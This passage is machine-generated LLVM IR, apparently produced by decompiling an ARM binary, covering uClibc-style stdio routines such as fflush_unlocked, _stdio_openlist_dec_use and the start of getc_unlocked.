  %v2_1a294 = icmp ult i32 %v3_1a290, 2
  br i1 %v2_1a294, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_1a294, %entry ]
  %v0_1a29c = phi i32 [ 0, %bb ], [ %v1_1a294, %entry ]
  store i32 %storemerge, i32* %r8.global-to-local, align 4
  %v2_1a29c = icmp eq i32 %v0_1a29c, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_1a29c, label %dec_label_pc_1a2e0, label %dec_label_pc_1a2b4

dec_label_pc_1a2b4:                               ; preds = %thread-pre-split
  %v2_1a2a0 = ptrtoint i32* %stack_var_-40 to i32
  %v1_1a2b4 = add i32 %arg3, 56
  store i32 %v1_1a2b4, i32* @r4, align 4
  store i32 %v2_1a2a0, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 %v1_1a2b4, i32* @r2, align 4
  %v1_1a2cc = call i32 @_pthread_cleanup_push_defer()
  %v0_1a2d0 = load i32, i32* @r4, align 4
  store i32 107232, i32* @lr, align 4
  %v2_1a2dc = call i32 @__pthread_return_0(i32 %v0_1a2d0)
  %v0_1a2e0.pre = load i32, i32* @r6, align 4
  %v0_1a2e4.pre = load i32, i32* @r7, align 4
  %v0_1a2e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a2e0

dec_label_pc_1a2e0:                               ; preds = %thread-pre-split, %dec_label_pc_1a2b4
  %v0_1a2e8 = phi i32 [ %arg3, %thread-pre-split ], [ %v0_1a2e8.pre, %dec_label_pc_1a2b4 ]
  %v0_1a2e4 = phi i32 [ %arg2, %thread-pre-split ], [ %v0_1a2e4.pre, %dec_label_pc_1a2b4 ]
  %v0_1a2e0 = phi i32 [ %arg1, %thread-pre-split ], [ %v0_1a2e0.pre, %dec_label_pc_1a2b4 ]
  %v3_1a2ec = inttoptr i32 %v0_1a2e0 to i8*
  %v4_1a2ec = call i32 @__GI_fgets_unlocked(i8* %v3_1a2ec, i32 %v0_1a2e4, i32 %v0_1a2e8)
  %v0_1a2f0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1a2f0 = icmp eq i32 %v0_1a2f0, 0
  store i32 %v4_1a2ec, i32* %r4.global-to-local, align 4
  br i1 %v2_1a2f0, label %.thread6, label %bb18

bb18:                                             ; preds = %dec_label_pc_1a2e0
  store i32 107276, i32* @lr, align 4
  call void @__pseudo_branch(i32 98448)
  %v0_1a30c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1a2e0, %bb18
  %v0_1a30c = phi i32 [ %v4_1a2ec, %dec_label_pc_1a2e0 ], [ %v0_1a30c.pre, %bb18 ]
  %v2_1a314 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1a314, i32* @r4, align 4
  store i32 %v6_1a28c, i32* @r5, align 4
  store i32 %v9_1a28c, i32* @r6, align 4
  store i32 %v12_1a28c, i32* @r7, align 4
  ret i32 %v0_1a30c

; uselistorder directives
  uselistorder i32 %v1_1a294, { 1, 0 }
  uselistorder i32 %v3_1a290, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1a2e0, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1a32c = ptrtoint i32* %stack_var_-52 to i32
  %v2_1a330 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1a330, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2e220.1325 to i32), i32* @r2, align 4
  store i32 98440, i32* %r4.global-to-local, align 4
  %v1_1a344 = call i32 @_pthread_cleanup_push_defer()
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* %r5.global-to-local, align 4
  %v2_1a354 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e220.1325 to i32))
  %v2_1a35c = load i32, i32* @global_var_32478.1616, align 4
  %v7_1a360 = icmp eq i32 %v2_1a35c, 1
  br i1 %v7_1a360, label %dec_label_pc_1a368, label %dec_label_pc_1a414

dec_label_pc_1a368:                               ; preds = %entry
  %v2_1a36c = load i32, i32* @global_var_3247c.1619, align 4
  %tmp19 = icmp slt i32 %v2_1a36c, 1
  br i1 %tmp19, label %dec_label_pc_1a414, label %dec_label_pc_1a378

dec_label_pc_1a378:                               ; preds = %dec_label_pc_1a368
  store i32 %v2_1a32c, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2e208.1323 to i32), i32* @r2, align 4
  %v1_1a388 = call i32 @_pthread_cleanup_push_defer()
  %v2_1a394 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e208.1323 to i32))
  %v2_1a39c = load i32, i32* bitcast (i32** @global_var_2e204.1327 to i32*), align 4
  store i32 %v2_1a39c, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32** @global_var_2e204.1327 to i32), i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1a3ec2 = icmp eq i32 %v2_1a39c, 0
  br i1 %v2_1a3ec2, label %dec_label_pc_1a3f8, label %dec_label_pc_1a3ac

dec_label_pc_1a3ac:                               ; preds = %dec_label_pc_1a378, %dec_label_pc_1a3e8
  %v1_1a3c4 = phi i32 [ %v0_1a3e8, %dec_label_pc_1a3e8 ], [ %v2_1a39c, %dec_label_pc_1a378 ]
  %v1_1a3ac = inttoptr i32 %v1_1a3c4 to i8*
  %v2_1a3ac = load i8, i8* %v1_1a3ac, align 1
  %v3_1a3ac = zext i8 %v2_1a3ac to i32
  %v1_1a3b0 = add i32 %v1_1a3c4, 1
  %v2_1a3b0 = inttoptr i32 %v1_1a3b0 to i8*
  %v3_1a3b0 = load i8, i8* %v2_1a3b0, align 1
  %v4_1a3b0 = zext i8 %v3_1a3b0 to i32
  %v4_1a3b4 = mul nuw nsw i32 %v3_1a3ac, 256
  %v5_1a3b4 = or i32 %v4_1a3b0, %v4_1a3b4
  %v2_1a3b8 = and i32 %v5_1a3b4, 32816
  %v7_1a3bc = icmp eq i32 %v2_1a3b8, 48
  %v1_1a3c0 = add i32 %v1_1a3c4, 32
  %v2_1a3c0 = inttoptr i32 %v1_1a3c0 to i32*
  %v3_1a3c0 = load i32, i32* %v2_1a3c0, align 4
  store i32 %v3_1a3c0, i32* %r5.global-to-local, align 4
  br i1 %v7_1a3bc, label %dec_label_pc_1a3cc, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_1a3ac
  store i32 %v1_1a3c4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a3e8

dec_label_pc_1a3cc:                               ; preds = %dec_label_pc_1a3ac
  %v0_1a3cc = load i32, i32* %r6.global-to-local, align 4
  %v2_1a3cc = icmp eq i32 %v0_1a3cc, 0
  br i1 %v2_1a3cc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1a3cc
  %v2_1a3d0 = load i32, i32* %r7.global-to-local, align 4
  %v3_1a3d0 = inttoptr i32 %v2_1a3d0 to i32*
  store i32 %v3_1a3c0, i32* %v3_1a3d0, align 4
  br label %bb20

.thread:                                          ; preds = %dec_label_pc_1a3cc
  %v3_1a3d4 = add i32 %v0_1a3cc, 32
  %v4_1a3d4 = inttoptr i32 %v3_1a3d4 to i32*
  store i32 %v3_1a3c0, i32* %v4_1a3d4, align 4
  br label %bb20

bb20:                                             ; preds = %bb, %.thread
  %v0_1a3d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a3d8 = inttoptr i32 %v0_1a3d8 to i8*
  %v2_1a3d8 = load i8, i8* %v1_1a3d8, align 1
  %v1_1a3dc = and i8 %v2_1a3d8, 32
  %v2_1a3dc = icmp eq i8 %v1_1a3dc, 0
  br i1 %v2_1a3dc, label %bb22, label %bb21

bb21:                                             ; preds = %bb20
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v1_1a3e4 = xor i1 %v2_1a3dc, true
  call void @__pseudo_cond_branch(i1 %v1_1a3e4, i32 ptrtoint (i32* @global_var_16dac.1607 to i32))
  %v0_1a3e8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1a3e8

dec_label_pc_1a3e8:                               ; preds = %.thread11, %bb22
  %v0_1a3e8 = phi i32 [ %v0_1a3e8.pre, %bb22 ], [ %v3_1a3c0, %.thread11 ]
  store i32 %v0_1a3e8, i32* %r4.global-to-local, align 4
  %v2_1a3ec = icmp eq i32 %v0_1a3e8, 0
  br i1 %v2_1a3ec, label %dec_label_pc_1a3f8, label %dec_label_pc_1a3ac

dec_label_pc_1a3f8:                               ; preds = %dec_label_pc_1a3e8, %dec_label_pc_1a378
  store i32 %v2_1a32c, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v1_1a408 = call i32 @_pthread_cleanup_pop_restore()
  %v0_1a410 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1a410, i32* @global_var_3247c.1619, align 4
  %v2_1a418.pre = load i32, i32* @global_var_32478.1616, align 4
  br label %dec_label_pc_1a414

dec_label_pc_1a414:                               ; preds = %entry, %dec_label_pc_1a368, %dec_label_pc_1a3f8
  %v2_1a418 = phi i32 [ %v2_1a35c, %entry ], [ 1, %dec_label_pc_1a368 ], [ %v2_1a418.pre, %dec_label_pc_1a3f8 ]
  %v1_1a41c = add i32 %v2_1a418, -1
  store i32 %v1_1a41c, i32* @global_var_32478.1616, align 4
  store i32 %v2_1a330, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v1_1a434 = call i32 @_pthread_cleanup_pop_restore()
  ret i32 %v1_1a434

; uselistorder directives
  uselistorder i32 %v0_1a3e8, { 2, 1, 0 }
  uselistorder i1 %v2_1a3dc, { 1, 0 }
  uselistorder i32 %v1_1a3c4, { 0, 1, 3, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i8 32, { 0, 2, 4, 1, 5, 6, 7, 3, 8, 9, 10, 11 }
  uselistorder i32* @global_var_3247c.1619, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1a414, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a3e8, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_1a3ac, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i8*, align 4
  store i32 ptrtoint (i32** @global_var_2e204.1327 to i32), i32* %r3.global-to-local, align 4
  %v10_1a470 = icmp eq i8* %arg1, bitcast (i32** @global_var_2e204.1327 to i8*)
  store i1 %v10_1a470, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %sl.global-to-local, align 4
  br i1 %v10_1a470, label %.thread, label %dec_label_pc_1a488

.thread:                                          ; preds = %entry
  store i32 0, i32* %sl.global-to-local, align 4
  store i8* null, i8** %stack_var_-56, align 4
  br label %dec_label_pc_1a498

dec_label_pc_1a488:                               ; preds = %entry
  %v2_1a48c = icmp eq i8* %arg1, null
  store i1 %v2_1a48c, i1* %cpsr_z.global-to-local, align 1
  store i8* inttoptr (i32 256 to i8*), i8** %stack_var_-56, align 4
  br i1 %v2_1a48c, label %dec_label_pc_1a498, label %dec_label_pc_1a5d4

dec_label_pc_1a498:                               ; preds = %.thread, %dec_label_pc_1a488
  %v2_1a498 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_2e220.1325 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 %v2_1a498, i32* @r0, align 4
  %v1_1a4b0 = call i32 @_pthread_cleanup_push_defer()
  %v2_1a4c0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e220.1325 to i32))
  %v2_1a4c8 = load i32, i32* @global_var_32478.1616, align 4
  %v1_1a4cc = add i32 %v2_1a4c8, 1
  store i32 %v1_1a4cc, i32* %r3.global-to-local, align 4
  store i32 %v1_1a4cc, i32* @global_var_32478.1616, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_1a498, i32* @r0, align 4
  %v1_1a4e4 = call i32 @_pthread_cleanup_pop_restore()
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2e208.1323 to i32), i32* @r2, align 4
  store i32 %v2_1a498, i32* @r0, align 4
  %v1_1a4f8 = call i32 @_pthread_cleanup_push_defer()
  %v2_1a504 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e208.1323 to i32))
  store i32 ptrtoint (i32** @global_var_2e204.1327 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_1a498, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v2_1a514 = load i32, i32* bitcast (i32** @global_var_2e204.1327 to i32*), align 4
  store i32 %v2_1a514, i32* %r8.global-to-local, align 4
  %v1_1a51c = call i32 @_pthread_cleanup_pop_restore()
  store i32 -1, i32* @r5, align 4
  %v2_1a5c425 = icmp eq i32 %v2_1a514, 0
  store i1 %v2_1a5c425, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a5c425, label %dec_label_pc_1a5cc, label %dec_label_pc_1a538

dec_label_pc_1a538:                               ; preds = %dec_label_pc_1a498, %dec_label_pc_1a5c0
  %v0_1a5cc29 = phi i32 [ %v0_1a5cc28, %dec_label_pc_1a5c0 ], [ %v1_1a51c, %dec_label_pc_1a498 ]
  %v0_1a544 = phi i32 [ %v3_1a5c0, %dec_label_pc_1a5c0 ], [ %v2_1a514, %dec_label_pc_1a498 ]
  %v1_1a538 = add i32 %v0_1a544, 1
  %v2_1a538 = inttoptr i32 %v1_1a538 to i8*
  %v3_1a538 = load i8, i8* %v2_1a538, align 1
  %v4_1a538 = zext i8 %v3_1a538 to i32
  store i32 %v4_1a538, i32* %r3.global-to-local, align 4
  %v1_1a53c = and i32 %v4_1a538, 64
  %v2_1a53c = icmp eq i32 %v1_1a53c, 0
  store i1 %v2_1a53c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a53c, label %dec_label_pc_1a5c0, label %dec_label_pc_1a544

dec_label_pc_1a544:                               ; preds = %dec_label_pc_1a538
  %v1_1a544 = add i32 %v0_1a544, 56
  store i32 %v1_1a544, i32* @r4, align 4
  store i32 %v1_1a544, i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 %v2_1a498, i32* @r0, align 4
  %v1_1a558 = call i32 @_pthread_cleanup_push_defer()
  %v0_1a55c = load i32, i32* @r4, align 4
  %v2_1a564 = call i32 @__pthread_return_0(i32 %v0_1a55c)
  %v0_1a568 = load i32, i32* %r8.global-to-local, align 4
  %v1_1a568 = inttoptr i32 %v0_1a568 to i32*
  %v2_1a568 = load i32, i32* %v1_1a568, align 4
  %v2_1a56c = load i8*, i8** %stack_var_-56, align 4
  %v3_1a56c = ptrtoint i8* %v2_1a56c to i32
  %v4_1a570 = udiv i32 %v2_1a568, 65536
  %v5_1a570 = or i32 %v3_1a56c, %v4_1a570
  %v1_1a574 = xor i32 %v5_1a570, 320
  store i32 %v1_1a574, i32* %r3.global-to-local, align 4
  %v1_1a578 = and i32 %v1_1a574, 832
  %v2_1a578 = icmp eq i32 %v1_1a578, 0
  store i1 %v2_1a578, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a578, label %dec_label_pc_1a580, label %bb

dec_label_pc_1a580:                               ; preds = %dec_label_pc_1a544
  store i32 %v0_1a568, i32* @r0, align 4
  %v0_1a584 = call i32 @__stdio_wcommit()
  %v2_1a588 = icmp eq i32 %v0_1a584, 0
  store i1 %v2_1a588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a588, label %.thread8, label %.thread10

.thread8:                                         ; preds = %dec_label_pc_1a580
  %v1_1a58c = load i32, i32* %r8.global-to-local, align 4
  %v2_1a58c = inttoptr i32 %v1_1a58c to i32*
  %v3_1a58c = load i32, i32* %v2_1a58c, align 4
  %v4_1a590 = udiv i32 %v3_1a58c, 65536
  %v2_1a594 = and i32 %v4_1a590, 65471
  store i32 %v2_1a594, i32* %r3.global-to-local, align 4
  %v2_1a598 = add i32 %v1_1a58c, 8
  %v3_1a598 = inttoptr i32 %v2_1a598 to i32*
  %v4_1a598 = load i32, i32* %v3_1a598, align 4
  %v4_1a59c33 = udiv i32 %v3_1a58c, 16777216
  store i32 %v4_1a59c33, i32* %r1.global-to-local, align 4
  %v3_1a5a0 = add i32 %v1_1a58c, 28
  %v4_1a5a0 = inttoptr i32 %v3_1a5a0 to i32*
  store i32 %v4_1a598, i32* %v4_1a5a0, align 4
  %v1_1a5a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a5a4 = trunc i32 %v1_1a5a4 to i8
  %v3_1a5a4 = load i32, i32* %r8.global-to-local, align 4
  %v4_1a5a4 = inttoptr i32 %v3_1a5a4 to i8*
  store i8 %v2_1a5a4, i8* %v4_1a5a4, align 1
  %v0_1a5a8.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a5a8.pr.pr.pr, label %.thread9, label %.thread10

.thread9:                                         ; preds = %.thread8
  %v1_1a5a8 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a5a8 = trunc i32 %v1_1a5a8 to i8
  %v3_1a5a8 = load i32, i32* %r8.global-to-local, align 4
  %v4_1a5a8 = add i32 %v3_1a5a8, 1
  %v5_1a5a8 = inttoptr i32 %v4_1a5a8 to i8*
  store i8 %v2_1a5a8, i8* %v5_1a5a8, align 1
  %v0_1a5ac.pr.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a5ac.pr.pr.pr.pr, label %bb, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_1a580, %.thread8, %.thread9
  %v1_1a5ac = load i32, i32* @r5, align 4
  store i32 %v1_1a5ac, i32* %sl.global-to-local, align 4
  br label %bb

bb:                                               ; preds = %dec_label_pc_1a544, %.thread9, %.thread10
  store i32 %v2_1a498, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v1_1a5bc = call i32 @_pthread_cleanup_pop_restore()
  %v0_1a5c0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a5c0

dec_label_pc_1a5c0:                               ; preds = %dec_label_pc_1a538, %bb
  %v0_1a5cc28 = phi i32 [ %v0_1a5cc29, %dec_label_pc_1a538 ], [ %v1_1a5bc, %bb ]
  %v0_1a5c0 = phi i32 [ %v0_1a544, %dec_label_pc_1a538 ], [ %v0_1a5c0.pre, %bb ]
  %v1_1a5c0 = add i32 %v0_1a5c0, 32
  %v2_1a5c0 = inttoptr i32 %v1_1a5c0 to i32*
  %v3_1a5c0 = load i32, i32* %v2_1a5c0, align 4
  store i32 %v3_1a5c0, i32* %r8.global-to-local, align 4
  %v2_1a5c4 = icmp eq i32 %v3_1a5c0, 0
  store i1 %v2_1a5c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a5c4, label %dec_label_pc_1a5cc, label %dec_label_pc_1a538

dec_label_pc_1a5cc:                               ; preds = %dec_label_pc_1a5c0, %dec_label_pc_1a498
  %v0_1a5cc = phi i32 [ %v1_1a51c, %dec_label_pc_1a498 ], [ %v0_1a5cc28, %dec_label_pc_1a5c0 ]
  %v1_1a5cc = call i32 @_stdio_openlist_dec_use(i32 %v0_1a5cc)
  %v0_1a614.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb47

dec_label_pc_1a5d4:                               ; preds = %dec_label_pc_1a488
  %v1_1a5d4 = add i32 %tmp, 1
  %v2_1a5d4 = inttoptr i32 %v1_1a5d4 to i8*
  %v3_1a5d4 = load i8, i8* %v2_1a5d4, align 1
  %v4_1a5d4 = zext i8 %v3_1a5d4 to i32
  %v1_1a5d8 = and i32 %v4_1a5d4, 64
  store i32 %v1_1a5d8, i32* %r3.global-to-local, align 4
  %v2_1a5d8 = icmp eq i32 %v1_1a5d8, 0
  store i1 %v2_1a5d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a5d8, label %bb46, label %dec_label_pc_1a5e4

bb46:                                             ; preds = %dec_label_pc_1a5d4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb47

dec_label_pc_1a5e4:                               ; preds = %dec_label_pc_1a5d4
  %v0_1a5e4 = call i32 @__stdio_wcommit()
  %v2_1a5e8 = icmp eq i32 %v0_1a5e4, 0
  store i1 %v2_1a5e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a5e8, label %.thread16, label %.thread21

.thread16:                                        ; preds = %dec_label_pc_1a5e4
  %v1_1a5ec = load i32, i32* %sl.global-to-local, align 4
  %v2_1a5ec = inttoptr i32 %v1_1a5ec to i32*
  %v3_1a5ec = load i32, i32* %v2_1a5ec, align 4
  %v4_1a5f0 = udiv i32 %v3_1a5ec, 65536
  %v2_1a5f4 = and i32 %v4_1a5f0, 65471
  store i32 %v2_1a5f4, i32* %r3.global-to-local, align 4
  %v2_1a5f8 = add i32 %v1_1a5ec, 8
  %v3_1a5f8 = inttoptr i32 %v2_1a5f8 to i32*
  %v4_1a5f8 = load i32, i32* %v3_1a5f8, align 4
  store i32 %v4_1a5f8, i32* %r1.global-to-local, align 4
  %v4_1a5fc32 = udiv i32 %v3_1a5ec, 16777216
  %v2_1a600 = trunc i32 %v4_1a5fc32 to i8
  %v4_1a600 = inttoptr i32 %v1_1a5ec to i8*
  store i8 %v2_1a600, i8* %v4_1a600, align 1
  %v0_1a604.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a604.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_1a604 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a604 = load i32, i32* %sl.global-to-local, align 4
  %v3_1a604 = add i32 %v2_1a604, 28
  %v4_1a604 = inttoptr i32 %v3_1a604 to i32*
  store i32 %v1_1a604, i32* %v4_1a604, align 4
  %v1_1a608 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a608 = trunc i32 %v1_1a608 to i8
  %v3_1a608 = load i32, i32* %sl.global-to-local, align 4
  %v4_1a608 = add i32 %v3_1a608, 1
  %v5_1a608 = inttoptr i32 %v4_1a608 to i8*
  store i8 %v2_1a608, i8* %v5_1a608, align 1
  %v0_1a60c.pr.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a60c.pr.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_1a5e4, %.thread16, %.thread18
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb47

.thread20:                                        ; preds = %.thread18
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %bb46, %.thread21, %dec_label_pc_1a5cc, %.thread20
  %v0_1a614 = phi i32 [ -1, %.thread21 ], [ 0, %bb46 ], [ %v0_1a614.pre, %dec_label_pc_1a5cc ], [ 0, %.thread20 ]
  ret i32 %v0_1a614

; uselistorder directives
  uselistorder i32 %v3_1a5c0, { 1, 2, 0 }
  uselistorder i32 %v1_1a51c, { 1, 0 }
  uselistorder i32 %v2_1a514, { 1, 0, 2 }
  uselistorder i1 %v2_1a48c, { 1, 0 }
  uselistorder i8** %stack_var_-56, { 2, 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 5, 6, 7, 2, 8, 3, 4, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 5, 1, 2, 3, 4, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 9, 5, 4, 6, 7, 8, 12, 10, 11 }
  uselistorder i32* bitcast (i32** @global_var_2e204.1327 to i32*), { 1, 2, 3, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_2e208.1323 to i32), { 0, 4, 1, 5, 2, 6, 7, 3, 8 }
  uselistorder i32* @global_var_32478.1616, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_2e220.1325 to i32), { 0, 6, 1, 7, 2, 8, 9, 3, 10, 11, 4, 12, 13, 5, 14 }
  uselistorder label %bb47, { 3, 1, 0, 2 }
  uselistorder label %.thread21, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a5c0, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a538, { 1, 0 }
  uselistorder label %dec_label_pc_1a498, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_1a640 = load i32, i32* @r4, align 4
  store i32 %v3_1a640, i32* %stack_var_-8, align 4
  %v0_1a644 = load i32, i32* @r0, align 4
  %v1_1a644 = add i32 %v0_1a644, 16
  %v2_1a644 = inttoptr i32 %v1_1a644 to i32*
  %v3_1a644 = load i32, i32* %v2_1a644, align 4
  store i32 %v3_1a644, i32* %r2.global-to-local, align 4
  %v1_1a648 = add i32 %v0_1a644, 24
  %v2_1a648 = inttoptr i32 %v1_1a648 to i32*
  %v3_1a648 = load i32, i32* %v2_1a648, align 4
  %v3_1a64c = icmp ult i32 %v3_1a644, %v3_1a648
  store i32 %v0_1a644, i32* @r4, align 4
  br i1 %v3_1a64c, label %bb, label %dec_label_pc_1a664

bb:                                               ; preds = %entry
  %v2_1a654 = inttoptr i32 %v3_1a644 to i8*
  %v3_1a654 = load i8, i8* %v2_1a654, align 1
  %v4_1a654 = zext i8 %v3_1a654 to i32
  store i32 %v4_1a654, i32* %r0.global-to-local, align 4
  %v6_1a654 = add i32 %v3_1a644, 1
  store i32 %v6_1a654, i32* %r2.global-to-local, align 4
  store i32 %v6_1a654, i32* %v2_1a644, align 4
  br label %dec_label_pc_1a764

dec_label_pc_1a664:                               ; preds = %entry
  %v1_1a664 = add i32 %v0_1a644, 1
  %v2_1a664 = inttoptr i32 %v1_1a664 to i8*
  %v3_1a664 = load i8, i8* %v2_1a664, align 1
  %v4_1a664 = zext i8 %v3_1a664 to i32
  %v1_1a668 = and i32 %v4_1a664, 131
  %tmp22 = icmp ugt i32 %v1_1a668, 128
  br i1 %tmp22, label %dec_label_pc_1a684, label %dec_label_pc_1a674

dec_label_pc_1a674:                               ; preds = %dec_label_pc_1a664
  store i32 128, i32* @r1, align 4
  %v0_1a678 = call i32 @__stdio_trans2r_o()
  store i32 %v0_1a678, i32* %r0.global-to-local, align 4
  %v2_1a67c = icmp eq i32 %v0_1a678, 0
  br i1 %v2_1a67c, label %dec_label_pc_1a674.dec_label_pc_1a684_crit_edge, label %dec_label_pc_1a760

dec_label_pc_1a674.dec_label_pc_1a684_crit_edge:  ; preds = %dec_label_pc_1a674
  %v0_1a684.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a684

dec_label_pc_1a684:                               ; preds = %dec_label_pc_1a674.dec_label_pc_1a684_crit_edge, %dec_label_pc_1a664
  %v2_1a6d0 = phi i32 [ %v0_1a684.pre, %dec_label_pc_1a674.dec_label_pc_1a684_crit_edge ], [ %v0_1a644, %dec_label_pc_1a664 ]
  %v1_1a684 = inttoptr i32 %v2_1a6d0 to i8*
  %v2_1a684 = load i8, i8* %v1_1a684, align 1
  %v3_1a684 = zext i8 %v2_1a684 to i32
  store i32 %v3_1a684, i32* %r2.global-to-local, align 4
  %v1_1a688 = add i32 %v2_1a6d0, 1
  %v2_1a688 = inttoptr i32 %v1_1a688 to i8*
  %v3_1a688 = load i8, i8* %v2_1a688, align 1
  %v4_1a688 = zext i8 %v3_1a688 to i32
  %v4_1a68c = mul nuw nsw i32 %v3_1a684, 256
  %v5_1a68c = or i32 %v4_1a688, %v4_1a68c
  store i32 %v5_1a68c, i32* %r2.global-to-local, align 4
  %v1_1a690 = and i32 %v4_1a688, 2
  %v2_1a690 = icmp eq i32 %v1_1a690, 0
  br i1 %v2_1a690, label %dec_label_pc_1a6c0, label %dec_label_pc_1a698

dec_label_pc_1a698:                               ; preds = %dec_label_pc_1a684
  %tmp23 = urem i8 %v3_1a688, 2
  %v1_1a698 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_1a698
  %v4_1a69c = and i32 %tmp18, 4
